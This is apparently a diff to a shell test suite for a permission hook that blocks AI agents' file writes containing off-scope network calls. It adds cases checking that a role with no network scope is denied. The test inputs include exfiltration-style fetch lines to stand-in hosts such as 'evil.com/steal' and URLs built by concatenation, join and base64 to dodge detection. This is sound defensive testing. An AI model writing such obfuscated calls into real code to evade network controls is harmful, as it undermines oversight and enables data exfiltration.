@@ -83,5 +83,28 @@ w ALLOW 'const s = "please fetch(the) latest report from ops";' "R60 prose strin
 # ── Out-of-scope LITERAL still caught by the whole-literal branch ─────
 w DENY 'await fetch("http://evil.com/steal");' "R60 out-of-scope absolute literal"
 
+# ── A role with NO network scope is the MOST restricted, not exempt ───
+# The first cut ran this check only where network.allow was declared —
+# the shape derive emits for an implementer has no network key, so the
+# shipped factory implementer still passed fetch('http://'+h). A judge
+# caught it. A constructed destination must never be weaker than a
+# literal one, and a literal off-scope URL is refused for this role.
+u() {
+  local expect="$1" content="$2" label="$3" out got=ALLOW
+  out=$(payload tool_name=Write file_path="$P/tests/e2e/u.spec.ts" content="$content" cwd="$P" agent_id=u1 agent_type=unscoped | bash "$H" 2>/dev/null)
+  [ -n "$out" ] && got=DENY
+  if [ "$got" = "$expect" ]; then assert_eq 1 1 "$label ($got)"; else assert_eq 1 0 "$label: got $got want $expect"; fi
+}
+# bind the unscoped role via agent_type
+python3 - "$P/.claude/kernel-mandate.json" <<'PY2' 2>/dev/null || sed -i 's/"unscoped": {/"unscoped": { "agentTypes": ["unscoped"],/' "$P/.claude/kernel-mandate.json"
+import json,sys
+p=sys.argv[1]; d=json.load(open(p)); d['roles']['unscoped']['agentTypes']=['unscoped']; json.dump(d,open(p,'w'))
+PY2
+u DENY  "const h='evil.example'; fetch('http://'+h)"              "R60 no network scope: constructed fetch (concat) → DENY"
+u DENY  "fetch(['ht','tp://','evil'].join(''))"                    "R60 no network scope: constructed fetch (join) → DENY"
+u DENY  "new WebSocket(atob('d3M6Ly9ldmls'))"                      "R60 no network scope: constructed WebSocket → DENY"
+u ALLOW "fetch('/api/x')"                                          "R60 no network scope: relative literal → ALLOW"
+u ALLOW "test('fetch(x) crash', async () => {})"                   "R60 no network scope: fetch(x) in a title → ALLOW"
+
 unset KERNEL_MANDATE_STATE_DIR KERNEL_MANDATE_MANIFEST
 rm -rf "$R60"
